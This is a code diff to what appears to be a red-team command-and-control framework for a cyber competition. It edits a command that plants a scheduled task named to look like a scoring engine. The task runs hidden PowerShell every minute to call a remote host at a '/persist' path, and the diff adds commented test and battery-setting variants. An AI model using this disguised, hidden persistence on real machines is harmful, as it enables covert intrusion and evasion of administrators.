@@ -390,10 +390,10 @@ class LateralMovement(BaseCommand):
 # 9. DK Conquest - Ping Machine
 ######################################
 class CurlScoringEndpoint(BaseCommand):
-    command_name = "curl_scoring_endpoint"
+    command_name = "schtask_curl_scoring_endpoint"
     command_help = (
-        "\tUsage: `curl_scoring_endpoint`\n"
-        "\tCurls scoring endpoint every 1 minute - RYAN SET THE TEAM NUMBER IN THE SCRIPT IF YOU HAVENT YET\n"
+        "\tUsage: `schtask_curl_scoring_endpoint`\n"
+        "\tCurls scoring endpoint every 1 minute via scheduled task- RYAN SET THE TEAM NUMBER IN THE SCRIPT IF YOU HAVENT YET\n"
     )
 
     def __init__(self, command, args_list, agent_id):
@@ -407,7 +407,19 @@ class CurlScoringEndpoint(BaseCommand):
                 'shell schtasks /create /sc minute /mo 1 /tn "ScoringEngine.V2.1.3" '
                 '/tr "powershell.exe -NoProfile -WindowStyle Hidden -Command \\"Invoke-WebRequest -UseBasicParsing http://10.30.0.100/persist/teamX\\"" '
             )
+
+            # test to see if works
+            # schedule_cmd = (
+            #     'shell schtasks /create /sc minute /mo 1 /tn "ScoringEngine.V2.1.3" '
+            #     '/tr "powershell.exe -NoProfile -WindowStyle Hidden -Command \\"Invoke-WebRequest -UseBasicParsing http://127.0.0.1:8000/persist/teamX\\"" '
+            # )
             run_task = 'shell schtasks /run /tn "ScoringEngine.V2.1.3"'
+
+            # allows to run when on batteries
+            # set_task_cmd = (
+            #     "shell powershell.exe -NoProfile -Command \"Set-ScheduledTask -TaskName 'ScoringEngine.V2.1.3' "
+            #     '-Settings (New-ScheduledTaskSettingsSet -DisallowStartIfOnBatteries:$false)"'
+            # )
 
             # Enqueue the command to create the task
             schedule_id = self.agent_class.enqueue_command(schedule_cmd)
